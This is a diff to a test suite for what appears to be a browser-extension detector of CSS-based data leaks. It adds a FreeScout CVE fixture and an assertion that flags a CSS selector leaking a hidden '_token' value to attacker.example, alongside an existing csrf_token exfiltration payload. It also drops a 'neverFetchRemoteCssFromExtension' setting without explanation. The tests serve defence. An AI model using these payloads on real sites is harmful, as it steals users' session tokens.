@@ -27,6 +27,7 @@ describe("SPEC and CVE_SPEC acceptance criteria", () => {
     expect(hasFinding('input[name="csrf_token"][type="hidden"]{--leaked-secret:attr(value);background-image:image-set(if(style(--leaked-secret:"alpha"): "https://attacker.example/hono-alpha.png"; else: "https://attacker.example/hono-other.png") 1x)}')).toBe(true);
     expect(hasFinding('.recipe-instructions .step-note{color:#4b5563;border-inline-start:0.25rem solid currentColor}')).toBe(false);
     expect(hasFinding('.message-content .overlay{position:fixed !important;inset:0}')).toBe(false);
+    expect(hasFinding('input[name="_token"][value^="a"]{background:url(https://attacker.example/freescout)}')).toBe(true);
   });
 
   it("does not treat same-origin decorative HTML/SVG resources as actionable leaks", () => {
@@ -61,8 +62,7 @@ describe("SPEC and CVE_SPEC acceptance criteria", () => {
       perOriginModes: {},
       logRetentionDays: 14,
       compatibility: {
-        neverFetchRemoteCssFromExtension: true,
-        enableDnrMitigation: true,
+          enableDnrMitigation: true,
         enableStrictThirdPartyBlocking: true,
         showPartialAnalysisFindings: true,
         enableFirefoxEnhancedMode: false,
@@ -132,7 +132,8 @@ describe("SPEC and CVE_SPEC acceptance criteria", () => {
       "ghsa-vrx2-77f2-ww34-justhtml-svg-filter.html",
       "cve-2026-26000-xwiki-css-exfil-comment.css",
       "cve-2026-44458-hono-jsx-ssr-inline-style.html",
-      "cve-2026-35046-tandoor-stored-recipe-style.html"
+      "cve-2026-35046-tandoor-stored-recipe-style.html",
+      "cve-2026-40497-freescout-style-token-exfil.html"
     ]) {
       expect(attacks.has(expected), expected).toBe(true);
       expect(attacks.has(`${expected}.expected.json`), `${expected}.expected.json`).toBe(true);
@@ -144,7 +145,8 @@ describe("SPEC and CVE_SPEC acceptance criteria", () => {
     const benign = new Set(readdirSync(join(join(process.cwd(), "tests", "fixtures", "benign"))));
     for (const expected of [
       "benign-hono-jsx-ssr-style-object-presentation.html",
-      "benign-tandoor-recipe-presentation-style.html"
+      "benign-tandoor-recipe-presentation-style.html",
+      "benign-freescout-signature-style.html"
     ]) {
       expect(benign.has(expected), expected).toBe(true);
       expect(benign.has(`${expected}.expected.json`), `${expected}.expected.json`).toBe(true);
